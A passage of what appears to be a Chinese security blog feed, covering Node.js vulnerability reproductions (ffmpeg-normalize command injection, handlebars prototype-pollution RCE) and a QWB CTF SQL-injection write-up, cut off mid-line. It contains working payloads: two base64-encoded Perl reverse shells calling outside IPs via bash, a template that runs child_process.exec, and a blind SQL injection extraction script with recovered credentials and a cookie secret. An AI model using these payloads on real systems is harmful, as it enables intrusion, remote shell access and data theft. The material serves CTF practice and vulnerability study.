<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> normalize = <span class="built_in">require</span>(<span class="string">&#x27;ffmpeg-normalize&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">normalize(&#123;</span><br><span class="line">    input: <span class="string">&#x27;input.mp4;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMS4xNS4yMjQuMTE0IjskcD0xMjM0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=|base64 -d|bash #&#x27;</span>,</span><br><span class="line">    output: <span class="string">&#x27;output.mp4&#x27;</span>,</span><br><span class="line">    loudness: &#123;</span><br><span class="line">        normalization: <span class="string">&#x27;ebuR128&#x27;</span>,</span><br><span class="line">        target: &#123;<span class="attr">input_i</span>: -<span class="number">23</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    verbose: <span class="literal">false</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">normalized</span>  =&gt;</span> &#123;&#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="number">123</span>)&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="%E6%9C%80%E8%BF%91%E7%9A%84node%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210625203828877.png" alt="image-20210625203828877"></p>
<h1 id="8-prisma"><a href="#8-prisma" class="headerlink" title="8.prisma"></a>8.prisma</h1><p>è¿™æ˜¯ä¸€ä¸ªç”¨äºç®¡ç†æ•°æ®åº“è¿æ¥çš„ç¬¬ä¸‰æ–¹åº“</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Data source</span></span><br><span class="line">datasource db &#123;</span><br><span class="line">  provider = <span class="string">&quot;postgresql&quot;</span></span><br><span class="line">  url      = env(<span class="string">&quot;DATABASE_URL&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generator</span></span><br><span class="line">generator client &#123;</span><br><span class="line">  provider = <span class="string">&quot;prisma-client-js&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Data model</span></span><br><span class="line">model Post &#123;</span><br><span class="line">  id        Int     @id @<span class="keyword">default</span>(autoincrement())</span><br><span class="line">  title     <span class="built_in">String</span></span><br><span class="line">  content   <span class="built_in">String</span>?</span><br><span class="line">  published <span class="built_in">Boolean</span> @<span class="keyword">default</span>(<span class="literal">false</span>)</span><br><span class="line">  author    User?   @relation(fields:  [authorId], <span class="attr">references</span>: [id])</span><br><span class="line">  authorId  Int?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">model User &#123;</span><br><span class="line">  id    Int     @id @<span class="keyword">default</span>(autoincrement())</span><br><span class="line">  email <span class="built_in">String</span>  @unique</span><br><span class="line">  name  <span class="built_in">String</span>?</span><br><span class="line">  posts Post[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="9-å…³äºhbsè¿˜å°±é‚£ä¸ªè¸©å‘"><a href="#9-å…³äºhbsè¿˜å°±é‚£ä¸ªè¸©å‘" class="headerlink" title="9. å…³äºhbsè¿˜å°±é‚£ä¸ªè¸©å‘"></a>9. å…³äºhbsè¿˜å°±é‚£ä¸ªè¸©å‘</h1><p>å·åœŸé‡æ¥ä¹‹å®¡è®¡hbsçš„æ¸²æŸ“å®Œæ•´æµç¨‹ã€‚</p>
<p>åŸæœ¬æ˜¯åœ¨åšå‡ºä¸Šé¢çš„ç ”ç©¶ä¹‹åæƒ³è‡ªå·±æ­å»ºä¸€ä¸ªé¢˜ç›®ï¼Œç»“æœè¿˜å°±ç–¯ç‹‚è¸©å‘äººäº†ã€‚æˆ‘çœŸæ˜¯ä¸ªå¤§å•¥æ¯”,ç çš„.æˆ‘åœ¨æ­ç¯å¢ƒçš„æ—¶å€™é‡è§äº†ä¸€ä¸ªå‘:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">npm install æœ‰æ—¶å€™å¹¶ä¸ä¼šæ ¹æ®ä½ å¾—packageé‡Œé¢çš„ç‰ˆæœ¬èµ°,ä½ å¯èƒ½éœ€è¦å»node_moduleç¡®è®¤ä¸€ä¸‹</span><br></pre></td></tr></table></figure>

<p>æˆ‘åœ¨å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™å°±å› ä¸ºä¸Šå½“äº†,</p>
<p><img src="image-20210627172914274.png" alt="image-20210627172914274"></p>
<p>è¿™é‡Œæ˜æ˜ç»™æˆ‘å†™çš„4.0.1,ä½†æ˜¯å®é™…ä¸Šè¿›å»åŒ…é‡Œçš„æ—¶å€™å´æ˜¯4.1.2. å¯¼è‡´payloadä¸€ç›´æ‰“ä¸é€šâ€¦(ä¸ºæ­¤æˆ‘ä¸€ç›´å¼€ç€debugæ¨¡å¼å¯¹ç€hbsçš„æ¸²æŸ“ç›¯äº†ä¸¤å¤©,è„‘è¢‹éƒ½è¦ç‚¸çƒäº†),æœ€åç»ˆäºæŠ˜è…¾å¥½äº†,æˆ‘ä»¬å¯ä»¥æƒ³è±¡ä¸€ä¸ªåœºæ™¯.å¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªç”¨hbsç½‘ç«™å¤„äº4.1ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”æ˜¯expressï¼Œä¹‹åå¦‚æœæ»¡è¶³å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶å°±å¯ä»¥RCEäº†</p>
<ul>
<li>åŸå‹é“¾æ±¡æŸ“</li>
<li>æ²¡æœ‰ä¸¥æ ¼çš„å–è¾“å‡º</li>
</ul>
<h2 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h2><p>åŸå‹é“¾æ±¡æŸ“çš„æƒ…å†µï¼Œä¸¾ä¾‹ï¼ˆè¿™é‡Œæˆ‘ç”¨äº†PWN2WINçš„æºç ä¿®æ”¹äº†ä¿®æ”¹æ¥ç”¨ï¼‰ï¼Œæ ¸å¿ƒåœ¨è¿™é‡Œï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    res.render(<span class="string">&quot;index&quot;</span>, &#123;services&#125;)   </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// API</span></span><br><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    jsonpatch.applyPatch(services, patch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;offline&quot;</span> <span class="keyword">in</span> <span class="built_in">Object</span>.values(services))&#123;</span><br><span class="line">        services.status = <span class="string">&quot;offline&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.json(services)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// TEST</span></span><br><span class="line">app.post(<span class="string">&#x27;/upload&#x27;</span>, upload.single(<span class="string">&#x27;file&#x27;</span>), <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = req.file;</span><br><span class="line">    res.send(&#123;<span class="attr">ret_code</span>: <span class="string">&#x27;0&#x27;</span>,<span class="string">&quot;filename&quot;</span>:file.path&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>å› ä¸ºjsonpatchè¿™ä¸ªæ˜¯å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´çš„ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·æ¥æ±¡æŸ“layoutå±æ€§</p>
<p><img src="image-20210627174535517.png" alt="image-20210627174535517"></p>
<p>è¿™æ ·å­å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¸”å¦‚æœå­˜åœ¨æ–‡ä»¶ä¸Šä¼ (è¿™é‡Œçš„æ–‡ä»¶ä¸æ‹˜æ³¥äºä»»ä½•åç¼€éƒ½å¯ä»¥è¢«æˆåŠŸç¼–è¯‘)ï¼Œä¸Šä¼ å¦‚ä¸‹æ¶æ„æ–‡ä»¶ã€‚</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">&#123;% raw %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="builtin-name">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iODEuNjkuMjAxLjY1IjskcD0xMjM0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=|base64 -d|bash&#x27;);&quot;</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">each</span></span> conslist&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span></span><br><span class="line"><span class="xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span></span><br><span class="line"><span class="xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">with</span></span>&#125;&#125;</span></span><br><span class="line"><span class="xml">&#123;% endraw %&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥getshelläº†ã€‚</p>
<h2 id="æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼å–å€¼"><a href="#æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼å–å€¼" class="headerlink" title="æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼å–å€¼"></a>æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼å–å€¼</h2><p>è¿™ç§æƒ…å†µæ›´åŠ å¸¸è§ï¼Œå› ä¸ºç¨‹åºå‘˜ä»¬å–œæ¬¢è¿™æ ·å­åšæ¥æ˜¾å¾—ä»£ç æ›´åŠ æœ‰æ¡ç†æ€§ï¼Œï¼ˆä¹Ÿæ›´æ–¹ä¾¿ï¼‰</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">&#x27;index&#x27;</span>, profile)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°†ç”¨æˆ·çš„å–å€¼è¿›è¡Œæ¸²æŸ“ï¼Œä½†æ˜¯ç”¨æˆ·çš„è¾“å…¥å¯ä»¥æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥</p>
<p><img src="image-20210627175144942.png" alt="image-20210627175144942"></p>
<p>å³å¯ä»»æ„æ–‡ä»¶è¯»å–å¹¶è¿›è¡ŒRCE</p>
]]></content>
      <tags>
        <tag>åŸå‹é“¾æ±¡æŸ“</tag>
        <tag>node</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>QWBæ‰˜çº³å¤š</title>
    <url>/2021/06/25/QWB%E6%89%98%E7%BA%B3%E5%A4%9A/</url>
    <content><![CDATA[<p>è€ƒç‚¹ï¼š</p>
<ul>
<li>mysqlå‚¨å­˜å¼•æ“æ–°æ´»</li>
<li>SSTIç»•è¿‡</li>
</ul>
<p>æœ‰ä¸€ä¸ªç™»é™†çš„åœ°æ–¹æœ‰ä¸€ä¸ªæ³¨å†Œçš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¦‚æœé‡å¤æ³¨å†Œç”¨æˆ·åçš„è¯ä¼šæŠ¥é”™ï¼Œé‚£ä¹ˆå¯ä»¥æ¨æµ‹æºç ä¸­å…ˆè¿›è¡Œäº†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> xxx <span class="keyword">where</span> username = <span class="string">&#x27;xxx&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœusernameæ²¡æœ‰é‡å¤çš„å†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> xx (<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>   ) <span class="keyword">values</span> (xxx);</span><br></pre></td></tr></table></figure>



<p>ç™»é™†çš„æ—¶å€™å°±è¿›è¡ŒæŸ¥è¯¢ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx <span class="keyword">where</span> username = <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘ä»¬éœ€è¦ä¿è¯çš„æ˜¯ä¸¤è¾¹éƒ½ä¸æŠ¥é”™ï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æ³¨å†Œä¸€ä¸ªç”¨æˆ·ä¸ºadminâ€™â€™ ï¼ŒåŒæ—¶å¯†ç ä¸ºadmin å³å¯ç™»é™†æˆåŠŸã€‚ã€‚ä½†æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<p>è¿™é‡Œä¸»è¦æ˜¯å‡ºé¢˜äººè¿‡æ»¤äº†tables colunsç­‰å…³é”®å­—ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•ç›´æ¥æ³¨å…¥å‡ºæ¥è¡¨çš„èŠ‚æ„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å°±éœ€è¦ä»‹ç»ä¸€ä¸‹PERFORMANCE_SCHEMAå¼•æ“äº†ã€‚</p>
<p><img src="image-20210625153703936.png" alt="image-20210625153703936"></p>
<p>å®˜æ–¹çš„è§£é‡Šæ˜¯è¯¥åº“ä¸»è¦æ˜¯ç”¨äºå‚¨å­˜æ•°æ®åº“çš„å…ƒæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨navicatçœ‹ä¸€ä¸‹è¿™ä¸ªåº“</p>
<p><img src="image-20210625153937120.png" alt="image-20210625153937120"></p>
<p>å…¶ä¸­æœ‰ä¸€ä¸ªè¡¨file_instancesä¼šå‚¨å­˜å„ç±»æ•°æ®åº“çš„æ–‡ä»¶è·¯å¾„ï¼Œæ•…æˆ‘ä»¬è‹¥èƒ½å¯¹å…¶è¿›è¡ŒæŸ¥è¯¢ï¼Œå°±å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„è¡¨åäº†ã€‚</p>
<p><img src="image-20210625154443043.png" alt="image-20210625154443043"></p>
<p>è¡¨çš„èŠ‚æ„åˆ™æ˜¯é€šè¿‡æŸ¥çœ‹events_statements_summary_by_digest è¡¨ï¼Œè¯¥è¡¨ä¼šè®°å½•æ‰€æœ‰çš„sqlæ‰§è¡Œè¯­å¥ï¼Œé€šè¿‡éšä¾¿æä¸¤ä¸ªç™»å½•ï¼Œæ³¨å†ŒÂ·ç­‰è¯­å¥å°±ä¼šè¢«è®°å½•åˆ°è¯¥è¡¨é‡Œé¢äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ³¨å…¥å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select (DIGEST_TEXT) FROM performance_schema.events_statements_summary_by_digest</span><br></pre></td></tr></table></figure>

<p><img src="image-20210625154807355.png" alt="image-20210625154807355"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å»æä¸€ä¸ªè¯­å¥äº†,å‘ç°ç­‰å·ï¼Œå¤§äºå·ï¼Œå°äºå·éƒ½è¢«banäº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨inè¯­å¥è¿›è¡Œç»•è¿‡</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#x27; or  if(1&gt;0,1,0)  or &#x27;0</span><br></pre></td></tr></table></figure>

<p><img src="image-20210625160455963.png" alt="image-20210625160455963"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">for a in  range(1,300):</span><br><span class="line">    for i in range(130,-1,-1):</span><br><span class="line">        if(i&lt;30):</span><br><span class="line">            exit(0)</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;f96ea2c5-35a7-444f-8eee-4a086e4797dd.node3.buuoj.cn&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select group_concat(qwbqwbqwbuser,0x7e,qwbqwbqwbpass)  FROM qwbtttaaab111e ),&quot; + str(a) + &quot;,1)) in (&quot; + str(i) + &quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        #admin~we111c000me_to_qwb</span><br><span class="line">        #url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select (DIGEST_TEXT)  FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in (&#39;qwb&#39;) limit 2,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        #INSERT INTO &#96;qwbtttaaab111e&#96; ( &#96;qwbqwbqwbuser&#96; , &#96;qwbqwbqwbpass&#96; ) VALUES (...)</span><br><span class="line">        #url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select (file_name)  FROM performance_schema.file_instances limit 150,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;this username&#39; in r.text:</span><br><span class="line">            print(chr(i),end&#x3D;&#39;&#39;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            if(&#39;success&#39; in r.text):</span><br><span class="line">                pass</span><br><span class="line">            else:</span><br><span class="line">                print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ä¹‹åæŠŠæºç èƒ½å¤Ÿæå‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re</span><br><span class="line">settings = &#123;<span class="string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="string">&#x27;static&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;</span><br><span class="line">db_username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">db_password = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>) == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(<span class="string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> results[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                    self.set_secure_cookie(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.finish(<span class="string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cursor.close()</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        word_bans = [<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;inno&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>]</span><br><span class="line">        bans = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> word_bans:</span><br><span class="line">            <span class="keyword">if</span> re.search(ban, username, re.IGNORECASE):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> username:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span 